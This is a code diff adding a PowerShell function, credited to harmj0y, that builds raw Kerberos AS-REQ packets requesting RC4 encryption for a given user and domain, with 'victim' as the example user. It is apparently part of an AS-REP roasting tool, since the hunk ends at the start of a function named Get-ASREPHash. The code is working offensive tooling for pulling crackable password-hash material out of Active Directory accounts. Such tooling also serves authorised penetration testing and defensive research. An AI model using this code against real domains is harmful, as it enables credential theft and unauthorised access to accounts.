@@ -4301,6 +4301,153 @@ requests
     }
 }
 
+function New-ASReq {
+<#
+.SYNOPSIS
+Builds a RC4 specified KRB5 AS-REQ packet for the given domain\user.
+Author: Will Schroeder (@harmj0y)  
+License: BSD 3-Clause  
+Required Dependencies: BouncyCastle
+.DESCRIPTION
+This function uses the BouncyCastle ASN.1 encoding library to build a
+customized KRB_KDC_REQ packet with the passed -UserName and -Domain.
+The accepted encryption type is set to 23 (eTYPE-ARCFOUR-HMAC-MD5 / RC4).
+KRB_KDC_REQ definition from RFC 1510 http://www.freesoft.org/CIE/RFC/1510/55.htm
+    AS-REQ ::=         [APPLICATION 10] KDC-REQ
+    TGS-REQ ::=        [APPLICATION 12] KDC-REQ
+    KDC-REQ ::=        SEQUENCE {
+               pvno[1]               INTEGER,
+               msg-type[2]           INTEGER,
+               padata[3]             SEQUENCE OF PA-DATA OPTIONAL,
+               req-body[4]           KDC-REQ-BODY
+    }
+    PA-DATA ::=        SEQUENCE {
+               padata-type[1]        INTEGER,
+               padata-value[2]       OCTET STRING,
+                             -- might be encoded AP-REQ
+    }
+    KDC-REQ-BODY ::=   SEQUENCE {
+                kdc-options[0]       KDCOptions,
+                cname[1]             PrincipalName OPTIONAL,
+                             -- Used only in AS-REQ
+                realm[2]             Realm, -- Server's realm
+                             -- Also client's in AS-REQ
+                sname[3]             PrincipalName OPTIONAL,
+                from[4]              KerberosTime OPTIONAL,
+                till[5]              KerberosTime,
+                rtime[6]             KerberosTime OPTIONAL,
+                nonce[7]             INTEGER,
+                etype[8]             SEQUENCE OF INTEGER, -- EncryptionType,
+                             -- in preference order
+                addresses[9]         HostAddresses OPTIONAL,
+                enc-authorization-data[10]   EncryptedData OPTIONAL,
+                             -- Encrypted AuthorizationData encoding
+                additional-tickets[11]       SEQUENCE OF Ticket OPTIONAL
+    }
+.PARAMETER UserName
+Specifies the user name to build the AS-REQ for.
+.PARAMETER Domain
+Specifies the domain to build the AS-REQ for.
+.EXAMPLE
+New-ASReq -UserName victim -Domain testlab.local
+Returns the raw bytes for a kerberos AS-REQ packet encoded
+with victim@testlab.local.
+.LINK
+http://www.freesoft.org/CIE/RFC/1510/
+#>
+
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        [Alias('User')]
+        [String]
+        $UserName,
+
+        [Parameter(Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Domain
+    )
+
+    ###############################################
+    #
+    # AS-REQ header fields
+    #
+    ###############################################
+
+    # kerberos protocol version number, must be 5 for windows
+    $pvno = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 1, (New-Object Org.BouncyCastle.Asn1.DERInteger 5)
+    # msgtype = 10 -> krb-as-req
+    $msgtype = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 2, (New-Object Org.BouncyCastle.Asn1.DERInteger 10)
+
+
+    ###############################################
+    #
+    # padata section
+    #
+    ###############################################
+
+    # kRB5-PADATA-PA-PAC-REQUEST
+    $padatatype = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 1, (New-Object Org.BouncyCastle.Asn1.DERInteger 128)
+
+    # bytes indicate include pac == true
+    $padata = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 2, (New-Object Org.BouncyCastle.Asn1.DEROctetString (,@(0x30,0x05,0xa0,0x03,0x01,0x01,0xff)))
+    $PAElementDataSeq = New-Object Org.BouncyCastle.Asn1.DERSequence @($padatatype, $padata)
+
+    # build the pdaata structure
+    $PADataSeq = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 3, (New-Object Org.BouncyCastle.Asn1.DERSequence $PAElementDataSeq)
+
+
+    ###############################################
+    #
+    # req-body section
+    #
+    ###############################################
+
+    # options -> forwardable, renewable, renewable-ok
+    $kdcOption = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 0, (New-Object Org.BouncyCastle.Asn1.DERBitString (,@(0x40,0x80,0x00,0x10)))
+
+    # cname
+    # 1 = kRB5-NT-PRINCIPAL
+    $cnameType = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 0, (New-Object Org.BouncyCastle.Asn1.DERInteger 1)
+    $cnameString = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 1, (New-Object Org.BouncyCastle.Asn1.DERSequence (New-Object Org.BouncyCastle.Asn1.DERGeneralString $UserName))
+    $cname = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 1, (New-Object Org.BouncyCastle.Asn1.DERSequence @($cnameType, $cnameString))
+
+    $realm = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 2, (New-Object Org.BouncyCastle.Asn1.DERGeneralString $Domain)
+
+    # 2 = kRB5-NT-SRV-INST
+    $snameType = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 0, (New-Object Org.BouncyCastle.Asn1.DERInteger 2)
+    $snameStringSeq = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 1, (New-Object Org.BouncyCastle.Asn1.DERSequence @((New-Object Org.BouncyCastle.Asn1.DERGeneralString 'krbtgt'), (New-Object Org.BouncyCastle.Asn1.DERGeneralString $Domain)))
+    $sname = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 3, (New-Object Org.BouncyCastle.Asn1.DERSequence @($snameType, $snameStringSeq))
+
+    # timestamp from kekeo ;)
+    $till = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 5, (New-Object Org.BouncyCastle.Asn1.DERGeneralizedTime '20370913024805Z')
+
+    # mimikatz nonce ;)
+    $nonce = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 7, (New-Object Org.BouncyCastle.Asn1.DERInteger 12381973)
+
+    # 23 = eTYPE-ARCFOUR-HMAC-MD5
+    $etype = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 8, (New-Object Org.BouncyCastle.Asn1.DERSequence (New-Object Org.BouncyCastle.Asn1.DERInteger 23))
+
+
+    # build the req-body structure
+    $ReqBodySeq = New-Object Org.BouncyCastle.Asn1.DERTaggedObject 4, (New-Object Org.BouncyCastle.Asn1.DERSequence @($kdcOption, $cname, $realm, $sname, $till, $nonce, $etype))
+
+
+    # put everything together for the final AS-REQ ASN.1 structure
+    $ASReqSeq = New-Object Org.BouncyCastle.Asn1.DERSequence @($pvno, $msgtype, $PADataSeq, $ReqBodySeq)
+
+    # add the app tag
+    $AppSeq = New-Object Org.BouncyCastle.Asn1.DERApplicationSpecific 10, $ASReqSeq
+
+    # prefix with the total length
+    $Encoded = $AppSeq.GetDerEncoded()
+    $LengthBytes = [System.BitConverter]::GetBytes($Encoded.Length)
+    [Array]::Reverse($LengthBytes)
+    $LengthBytes + $Encoded
+}
+
 function Get-ASREPHash {
 <#
 .SYNOPSIS
